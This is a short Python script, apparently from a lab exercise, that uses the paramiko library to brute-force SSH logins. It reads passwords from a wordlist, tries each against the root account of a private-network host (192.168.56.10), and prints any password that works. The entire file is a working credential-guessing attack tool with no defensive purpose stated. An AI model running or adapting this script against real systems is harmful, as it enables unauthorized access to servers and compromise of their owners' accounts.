import paramiko
import sys

def brute_ssh(host, user, wordlist):
    client = paramiko.SSHClient()
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    with open(wordlist, 'r') as f:
        for password in f:
            password = password.strip()
            try:
                client.connect(host, username=user, password=password, timeout=5)
                print(f"Sucesso: {user}:{password}")
                return True
            except:
                pass
    return False

if __name__ == "__main__":
    brute_ssh("192.168.56.10", "root", "wordlist.txt")  # Wordlist com "weakpass"
